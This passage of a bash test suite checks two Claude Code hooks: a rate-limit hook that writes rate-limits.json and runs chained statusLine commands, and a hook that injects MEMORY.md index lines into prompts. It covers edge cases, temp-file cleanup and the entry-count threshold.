  elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import os,time; os.utime('$file', (time.time()-$secs, time.time()-$secs))"
  else
    printf 'SKIP: _set_mtime_secs_ago requires perl or python3\n' >&2
    return 1
  fi
}

rl_hook_happy_path() {
  # Verifies that a valid rate_limits payload writes rate-limits.json with the
  # correct five_hour, seven_day percentages, and an updated_at timestamp.
  # Steps:
  #   1. Run the hook with JSON containing five_hour (25%) and seven_day (10%)
  #   2. Assert rate-limits.json exists with correct field values and updated_at
  local name="rl-hook/happy-path-writes-file" rl_home
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":25,"resets_at":9999999999},"seven_day":{"used_percentage":10,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" ]] && jq -e '.five_hour.used_percentage == 25 and .seven_day.used_percentage == 10 and (.updated_at | type) == "number"' "$rl_home/rate-limits.json" >/dev/null 2>&1; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — file: %s\n' "$name" "$(cat "$rl_home/rate-limits.json" 2>/dev/null || echo MISSING)"
  fi
  rm -rf "$rl_home"
}

rl_hook_missing_rate_limits() {
  # Verifies that a payload without a rate_limits key exits 0 and does not
  # create rate-limits.json (no partial write on irrelevant payloads).
  # Steps:
  #   1. Run the hook with JSON that has no rate_limits key
  #   2. Assert exit 0 and rate-limits.json does not exist
  local name="rl-hook/missing-rate-limits-no-write" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '%s' '{"other_key":"value"}' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s file_exists=%s\n' "$name" "$status" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_malformed_json() {
  # Verifies that malformed JSON input exits 0 and does not create rate-limits.json
  # (hook must not crash or produce partial output on bad input).
  # Steps:
  #   1. Run the hook with a non-JSON payload string
  #   2. Assert exit 0 and rate-limits.json does not exist
  local name="rl-hook/malformed-json-exits-0" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '%s' 'not-json{{{' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s\n' "$name" "$status"
  fi
  rm -rf "$rl_home"
}

rl_hook_chain_called() {
  # Verifies that when statusline-chain.conf holds a bare executable path,
  # the hook invokes it and still writes rate-limits.json.
  # Steps:
  #   1. Write a chain script that creates a sentinel file on invocation
  #   2. Write the script path to statusline-chain.conf
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert rate-limits.json exists and the sentinel file was created
  local name="rl-hook/chain-called" rl_home chain_log chain_script
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-called"
  chain_script="$rl_home/chain.sh"
  cat > "$chain_script" <<'CHAINEOF'
#!/usr/bin/env bash
touch "$(dirname "$0")/chain-called"
CHAINEOF
  chmod +x "$chain_script"
  printf '%s\n' "$chain_script" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" && -f "$chain_log" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-called=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$(test -f "$chain_log" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_multiline_chain_called() {
  # Verifies that statusline-chain.conf can hold multiple command lines so
  # several statusLine tools can share one live hook slot.
  # Steps:
  #   1. Write two chain scripts that append markers to one sentinel file
  #   2. Write both script paths to statusline-chain.conf
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert both scripts ran in order
  local name="rl-hook/multiline-chain-called" rl_home chain_log first_chain second_chain actual
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-order"
  first_chain="$rl_home/first-chain.sh"
  second_chain="$rl_home/second-chain.sh"
  cat > "$first_chain" <<CHAINEOF
#!/usr/bin/env bash
printf first >> "$chain_log"
CHAINEOF
  cat > "$second_chain" <<CHAINEOF
#!/usr/bin/env bash
printf ',second' >> "$chain_log"
CHAINEOF
  chmod +x "$first_chain" "$second_chain"
  {
    printf '%s\n' "$first_chain"
    printf '%s\n' "$second_chain"
  } > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  actual="$(cat "$chain_log" 2>/dev/null || true)"
  if [[ -f "$rl_home/rate-limits.json" && "$actual" == "first,second" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-order=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$actual"
  fi
  rm -rf "$rl_home"
}

rl_hook_chain_called_with_args() {
  # Verifies that a statusline-chain.conf entry that is a command string with
  # unquoted arguments is correctly invoked via bash -c and writes rate-limits.json.
  # Steps:
  #   1. Write a chain script that accepts arguments and creates a sentinel file
  #   2. Write "$script --some-arg" to statusline-chain.conf
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert rate-limits.json exists and the sentinel file was created
  local name="rl-hook/chain-called-with-args" rl_home chain_log chain_script
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-called"
  chain_script="$rl_home/chain.sh"
  cat > "$chain_script" <<'CHAINEOF'
#!/usr/bin/env bash
touch "$(dirname "$0")/chain-called"
CHAINEOF
  chmod +x "$chain_script"
  # Store command string with arguments (not a bare path).
  printf '%s\n' "$chain_script --some-arg" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" && -f "$chain_log" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-called=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$(test -f "$chain_log" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_chain_called_bash_c() {
  # Verifies that a statusline-chain.conf entry using bash -c shell syntax is
  # correctly executed and rate-limits.json is still written.
  # Steps:
  #   1. Write a bash -c '...' command string to statusline-chain.conf
  #   2. Run the hook with a valid rate_limits payload
  #   3. Assert rate-limits.json exists and the sentinel file was created by bash -c
  local name="rl-hook/chain-called-bash-c" rl_home chain_log
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-called"
  # bash -c style command string — the form that read -r -a would break.
  printf '%s\n' "bash -c 'touch \"$chain_log\"'" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" && -f "$chain_log" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-called=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$(test -f "$chain_log" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_empty_stdin() {
  # Verifies that empty stdin exits 0 without creating rate-limits.json
  # (guards against spurious writes when Claude Code sends a no-payload event).
  # Steps:
  #   1. Run the hook with empty stdin (printf '')
  #   2. Assert exit 0 and rate-limits.json does not exist
  local name="rl-hook/empty-stdin-exits-0" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s file_exists=%s\n' "$name" "$status" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

_hook_startup_cleans_stale_rate_tmp() {
  local name="rl-hook/startup-cleans-stale-rate-tmp" rl_home stale_file status
  # Verifies that the hook's startup sweep deletes a .rate-limits.json.tmp.*
  # file whose mtime is more than 60 minutes old (7200 s).
  # Steps:
  #   1. Create a temp CLAUDE_CONFIG_DIR and a .rate-limits.json.tmp.STALE file
  #   2. Set the file's mtime to 7200 seconds ago via _set_mtime_secs_ago
  #   3. Run the hook with empty stdin (no payload)
  #   4. Assert exit 0 and the stale file is gone
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  stale_file="$rl_home/.rate-limits.json.tmp.STALE"
  touch "$stale_file"
  _set_mtime_secs_ago "$stale_file" 7200 || { rm -rf "$rl_home"; return 0; }
  printf '' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -e "$stale_file" ]]; then
    pass "$name"
  else
    fail "$name" "$(printf '        exit=%s stale_exists=%s' "$status" "$(test -e "$stale_file" && echo yes || echo no)")"
  fi
  rm -rf "$rl_home"
}

hook_startup_cleans_stale_rate_tmp() {
  _hook_startup_cleans_stale_rate_tmp
}

_hook_startup_preserves_fresh_rate_tmp() {
  local name="rl-hook/startup-preserves-fresh-rate-tmp" rl_home fresh_tmp status
  # Verifies that the hook's startup sweep preserves a .rate-limits.json.tmp.*
  # file whose mtime is under the 60-minute cutoff (just created).
  # Steps:
  #   1. Create a temp CLAUDE_CONFIG_DIR and a .rate-limits.json.tmp.FRESH file
  #   2. Leave the file's mtime at the current time (fresh)
  #   3. Run the hook with empty stdin (no payload)
  #   4. Assert exit 0 and the fresh file still exists
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  fresh_tmp="$rl_home/.rate-limits.json.tmp.FRESH"
  touch "$fresh_tmp"
  printf '' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && -e "$fresh_tmp" ]]; then
    pass "$name"
  else
    fail "$name" "$(printf '        exit=%s fresh_exists=%s' "$status" "$(test -e "$fresh_tmp" && echo yes || echo no)")"
  fi
  rm -rf "$rl_home"
}

hook_startup_preserves_fresh_rate_tmp() {
  _hook_startup_preserves_fresh_rate_tmp
}

_hook_startup_cleans_61min_rate_tmp() {
  local name="rl-hook/startup-cleans-61min-rate-tmp" rl_home stale_file status
  # Verifies the just-outside boundary of the +60-minute stale-temp cutoff:
  # a file that is 61 minutes old (3660 s) must be deleted.
  # Steps:
  #   1. Create a temp CLAUDE_CONFIG_DIR and a .rate-limits.json.tmp.TEST61 file
  #   2. Set the file's mtime to 3660 seconds ago via _set_mtime_secs_ago
  #   3. Run the hook with empty stdin (no payload)
  #   4. Assert exit 0 and the file is gone
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  stale_file="$rl_home/.rate-limits.json.tmp.TEST61"
  touch "$stale_file"
  _set_mtime_secs_ago "$stale_file" 3660 || { rm -rf "$rl_home"; return 0; }
  printf '' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -e "$stale_file" ]]; then
    pass "$name"
  else
    fail "$name" "$(printf '        exit=%s stale_exists=%s' "$status" "$(test -e "$stale_file" && echo yes || echo no)")"
  fi
  rm -rf "$rl_home"
}

hook_startup_cleans_61min_rate_tmp() {
  _hook_startup_cleans_61min_rate_tmp
}

_hook_startup_preserves_59min_rate_tmp() {
  local name="rl-hook/startup-preserves-59min-rate-tmp" rl_home fresh_file status
  # Verifies the just-inside boundary of the +60-minute stale-temp cutoff:
  # a file that is 59 minutes old (3540 s) must be preserved.
  # Steps:
  #   1. Create a temp CLAUDE_CONFIG_DIR and a .rate-limits.json.tmp.TEST59 file
  #   2. Set the file's mtime to 3540 seconds ago via _set_mtime_secs_ago
  #   3. Run the hook with empty stdin (no payload)
  #   4. Assert exit 0 and the file still exists
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  fresh_file="$rl_home/.rate-limits.json.tmp.TEST59"
  touch "$fresh_file"
  _set_mtime_secs_ago "$fresh_file" 3540 || { rm -rf "$rl_home"; return 0; }
  printf '' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && -e "$fresh_file" ]]; then
    pass "$name"
  else
    fail "$name" "$(printf '        exit=%s fresh_exists=%s' "$status" "$(test -e "$fresh_file" && echo yes || echo no)")"
  fi
  rm -rf "$rl_home"
}

hook_startup_preserves_59min_rate_tmp() {
  _hook_startup_preserves_59min_rate_tmp
}

_hook_rate_tmp_exit_trap_cleans_up() {
  local name="rl-hook/rate-tmp-exit-trap-cleans-up" rl_home fake_bin fake_mv leaked
  # Verifies that the EXIT trap in hook-save-rate-limits.sh removes the
  # in-flight _rate_tmp file when the hook process is killed by SIGTERM
  # after mktemp but before the atomic mv completes.
  # Steps:
  #   1. Create a temp CLAUDE_CONFIG_DIR and a fake mv that sends SIGTERM to PPID
  #   2. Run the hook with a valid rate_limits payload and PATH-injected fake mv
  #   3. After the hook exits, find any .rate-limits.json.tmp.* files in the dir
  #   4. Assert no leaked temp files remain
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  fake_bin="$(mktemp -d)"
  fake_mv="$fake_bin/mv"
  cat > "$fake_mv" <<'MVEOF'
#!/bin/bash
kill -TERM $PPID
sleep 1
MVEOF
  chmod +x "$fake_mv"
  {
    printf '%s' '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' \
      | PATH="$fake_bin:$PATH" CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK"
  } 2>/dev/null || true
  leaked="$(find "$rl_home" -name '.rate-limits.json.tmp.*' -print -quit)"
  if [[ -z "$leaked" ]]; then
    pass "$name"
  else
    fail "$name" "$(printf '        leaked=%s' "$leaked")"
  fi
  rm -rf "$rl_home" "$fake_bin"
}

hook_rate_tmp_exit_trap_cleans_up() {
  _hook_rate_tmp_exit_trap_cleans_up
}

rl_hook_write_failure_chains() {
  # Verifies that a rate-limits.json write failure (unwritable CLAUDE_CONFIG_DIR)
  # does not prevent the configured chain command from being invoked; the hook
  # must still exit 0 so the chained StatusLine command is not silently dropped.
  # Steps:
  #   1. Create a temp dir; add statusline-chain.conf pointing to a chain script
  #   2. Make the dir read-only so rate-limits.json cannot be written
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert exit 0, chain sentinel exists, rate-limits.json absent
  local name="rl-hook/write-failure-chains" rl_home chain_dir chain_script chain_log status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_dir="$(mktemp -d)"
  chain_script="$chain_dir/chain.sh"
  chain_log="$chain_dir/chain-called"
  cat > "$chain_script" <<'CHAINEOF'
#!/usr/bin/env bash
touch "$(dirname "$0")/chain-called"
CHAINEOF
  chmod +x "$chain_script"
  printf '%s\n' "$chain_script" > "$rl_home/statusline-chain.conf"
  chmod 555 "$rl_home"
  printf '%s' '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' \
    | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  chmod 755 "$rl_home"
  if [[ "$status" == "0" && -f "$chain_log" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s chain-called=%s rate-limits.json=%s\n' \
      "$name" "$status" \
      "$(test -f "$chain_log" && echo yes || echo no)" \
      "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home" "$chain_dir"
}

rl_hook_chain_failure_isolated() {
  # Verifies that a failing chain command (non-zero exit) does not prevent
  # rate-limits.json from being written (|| true isolates chain failure).
  # Steps:
  #   1. Write "exit 1" as the chain command in statusline-chain.conf
  #   2. Run the hook with a valid rate_limits payload
  #   3. Assert hook exits 0 and rate-limits.json was written despite chain failure
  local name="rl-hook/chain-failure-isolated" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '%s\n' "exit 1" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  status=$?
  if [[ "$status" == "0" && -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s rate-limits.json=%s\n' "$name" "$status" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_happy_path
rl_hook_missing_rate_limits
rl_hook_malformed_json
rl_hook_empty_stdin
hook_startup_cleans_stale_rate_tmp
hook_startup_preserves_fresh_rate_tmp
hook_startup_cleans_61min_rate_tmp
hook_startup_preserves_59min_rate_tmp
hook_rate_tmp_exit_trap_cleans_up
rl_hook_chain_called
rl_hook_multiline_chain_called
rl_hook_chain_called_with_args
rl_hook_chain_called_bash_c
rl_hook_write_failure_chains
rl_hook_chain_failure_isolated

# =============================================================================
# hook-inject-memory
# =============================================================================

echo
$LIST || echo "== hook-inject-memory =="

inject_encoded_path() {
  local path="$1"
  path="${path#/}"
  printf -- '-%s' "${path//\//-}"
}

write_inject_memory() {
  local config_dir="$1" cwd="$2" content="$3" encoded
  encoded="$(inject_encoded_path "$cwd")"
  mkdir -p "$config_dir/projects/$encoded/memory"
  printf '%s' "$content" > "$config_dir/projects/$encoded/memory/MEMORY.md"
}

inject_hook_happy_path() {
  # Verifies MEMORY.md index lines are injected when cwd matches a project exactly.
  # Steps:
  #   1. Create a sandbox project MEMORY.md with two "- " index lines
  #   2. Run the hook with a UserPromptSubmit payload whose cwd matches the project
  #   3. Assert stdout contains only the index lines wrapped in delimiters
  local name="inject-hook/happy-path" dir cwd payload output expected status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'# title\n- alpha\n  - nested ignored\n- beta\nnot index\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  expected=$'=== auto-memory: MEMORY.md index ===\n- alpha\n- beta\n=== end auto-memory ==='
  if [[ "$status" == "0" && "$output" == "$expected" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_parent_fallback() {
  # Verifies ancestor project fallback is used when cwd has no direct MEMORY.md.
  # Steps:
  #   1. Create MEMORY.md for a parent project directory only
  #   2. Run the hook with cwd set to a nested child directory
  #   3. Assert stdout injects the parent project index line
  local name="inject-hook/parent-fallback" dir parent child payload output expected status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  parent="$dir/repo"
  child="$parent/packages/app"
  mkdir -p "$child"
  write_inject_memory "$dir" "$parent" $'# memory\n- parent index\n'
  payload="{\"cwd\":\"$child\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  expected=$'=== auto-memory: MEMORY.md index ===\n- parent index\n=== end auto-memory ==='
  if [[ "$status" == "0" && "$output" == "$expected" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_no_memory_found() {
  # Verifies missing MEMORY.md in cwd and ancestors exits 0 with empty stdout.
  # Steps:
  #   1. Create a sandbox config with no project memory files
  #   2. Run the hook with a valid cwd payload
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/no-memory-found" dir cwd payload output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/no-memory/subdir"
  mkdir -p "$cwd"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_empty_index() {
  # Verifies MEMORY.md without "- " index lines exits 0 with empty stdout.
  # Steps:
  #   1. Create a matching project MEMORY.md with no top-level index bullets
  #   2. Run the hook with a valid cwd payload
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/empty-index" dir cwd payload output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'# title\nnot an index\n  - nested ignored\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_malformed_payload() {
  # Verifies malformed JSON stdin never crashes or blocks the prompt.
  # Steps:
  #   1. Create a sandbox config directory
  #   2. Run the hook with non-JSON stdin
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/malformed-payload" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '%s' 'not-json{{{' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_empty_stdin() {
  # Verifies empty stdin exits 0 without stdout.
  # Steps:
  #   1. Create a sandbox config directory
  #   2. Run the hook with empty stdin
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/empty-stdin" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_missing_cwd() {
  # Verifies that a valid JSON payload with no "cwd" key exits 0 with empty
  # stdout — the cwd validation guard handles absent keys gracefully.
  # Steps:
  #   1. Run the hook with valid JSON payload containing no cwd field
  #   2. Assert exit 0 and empty stdout (hook silently skips)
  local name="inject-hook/missing-cwd" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '%s' '{}' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_non_string_cwd() {
  # Verifies that a valid JSON payload with a non-string "cwd" value (e.g. a
  # number) exits 0 with empty stdout — the isinstance check rejects it.
  # Steps:
  #   1. Run the hook with valid JSON payload where cwd is an integer (123)
  #   2. Assert exit 0 and empty stdout (hook silently skips)
  local name="inject-hook/non-string-cwd" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '%s' '{"cwd":123}' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_threshold_shows_directive() {
  # Verifies that when MEMORY.md has >= 50 index entries, the hook injects
  # ALL entries without truncation and appends a "run /memory-compress" directive.
  # Steps:
  #   1. Create a matching project MEMORY.md with 60 index lines (> threshold of 50)
  #   2. Run the hook with a valid cwd payload and capture stdout
  #   3. Assert all 60 lines appear (no truncation), delimiters present,
  #      and a "⚠ MEMORY.md has N entries" directive appears before closing delimiter
  local name="inject-hook/threshold-shows-directive" dir cwd payload output body status i directive_line
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  {
    printf '# title\n'
    for i in $(seq 1 60); do
      printf -- '- memory index line %03d\n' "$i"
    done
  } > "$dir/long-memory.md"
  write_inject_memory "$dir" "$cwd" "$(cat "$dir/long-memory.md")"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  body="$(printf '%s\n' "$output" | sed '1d;$d')"
  directive_line="$(printf '%s\n' "$body" | grep '^⚠' || true)"
  if [[ "$status" == "0" \
      && "$output" == ===\ auto-memory:\ MEMORY.md\ index\ ===$'\n'* \
      && "$output" == *$'\n'===\ end\ auto-memory\ === \
      && "$body" == *"memory index line 001"* \
      && "$body" == *"memory index line 060"* \
      && -n "$directive_line" \
      && "$directive_line" == *"run /memory-compress"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s directive=%q output_tail=%q\n' "$name" "$status" "$directive_line" "${output: -80}"
  fi
  rm -rf "$dir"
}

inject_hook_threshold_below_emits_no_directive() {
  # Verifies that exactly 49 index entries (one below the threshold of 50) does
  # NOT emit the /memory-compress directive — threshold is exclusive at 49.
  # Steps:
  #   1. Create a matching project MEMORY.md with exactly 49 index lines
  #   2. Run the hook and capture stdout
  #   3. Assert all 49 lines present, no "⚠" directive line in output
  local name="inject-hook/threshold-49-no-directive" dir cwd payload output body status i directive_line
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  {
    printf '# title\n'
    for i in $(seq 1 49); do
      printf -- '- memory index line %03d\n' "$i"
    done
  } > "$dir/memory49.md"
  write_inject_memory "$dir" "$cwd" "$(cat "$dir/memory49.md")"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  body="$(printf '%s\n' "$output" | sed '1d;$d')"
  directive_line="$(printf '%s\n' "$body" | grep '^⚠' || true)"
  if [[ "$status" == "0" \
      && "$body" == *"memory index line 049"* \
      && -z "$directive_line" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s directive=%q\n' "$name" "$status" "$directive_line"
  fi
  rm -rf "$dir"
}

